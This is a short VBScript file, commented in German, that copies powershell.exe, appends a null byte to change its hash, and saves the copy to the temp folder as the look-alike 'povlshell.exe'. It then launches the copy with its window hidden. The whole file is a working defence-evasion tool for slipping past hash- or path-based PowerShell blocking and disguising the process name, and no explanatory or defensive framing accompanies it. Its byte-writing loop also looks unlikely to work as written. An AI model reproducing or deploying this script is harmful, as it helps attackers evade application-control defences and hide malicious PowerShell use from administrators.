Dim Filename
Dim Bytearray
Dim bin
Dim Arraylength
Dim newFilename
Dim dir
Dim name
Dim retval
Dim objShell

Filename = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

' Datei als Binärdaten in Stream laden
Set bin = CreateObject("ADODB.Stream")
bin.Type = 1  ' Binärmodus
bin.Open
bin.LoadFromFile Filename

' Bytearray aus Datei lesen
Bytearray = bin.Read
bin.Close

' Prüfen, ob Bytearray tatsächlich ein Array ist
If Not IsArray(Bytearray) Then
    WScript.Echo "Fehler: Bytearray konnte nicht erstellt werden."
    WScript.Quit
End If

' Neues Bytearray mit zusätzlichem Null-Byte erstellen
Arraylength = UBound(Bytearray)
Dim tempArray()
ReDim tempArray(Arraylength + 1)

' Originaldaten kopieren
Dim i
For i = 0 To Arraylength
    tempArray(i) = Bytearray(i)
Next

' Null-Byte anhängen
tempArray(Arraylength + 1) = 0

' *** Hier kommt der entscheidende Fix ***
' Neues ADODB.Stream-Objekt verwenden
Set bin = CreateObject("ADODB.Stream")
bin.Type = 1  ' Binärmodus
bin.Open

' Bytearray in den Stream umwandeln (Byte für Byte schreiben)
For i = 0 To UBound(tempArray)
    bin.Write ChrB(tempArray(i)) ' Hier wird Byte für Byte in den Stream geschrieben
Next

bin.Position = 0  ' Sicherstellen, dass der Stream am Anfang steht

' Zielverzeichnis für neue Datei setzen
Set objShell = CreateObject("WScript.Shell")
dir = objShell.ExpandEnvironmentStrings("%TEMP%")
name = "povlshell.exe"
newFilename = dir & "\" & name

' Datei speichern
bin.SaveToFile newFilename, 2
bin.Close
Set bin = Nothing

' Datei ausführen
retval = objShell.Run(newFilename, 0, False)
Set objShell = Nothing
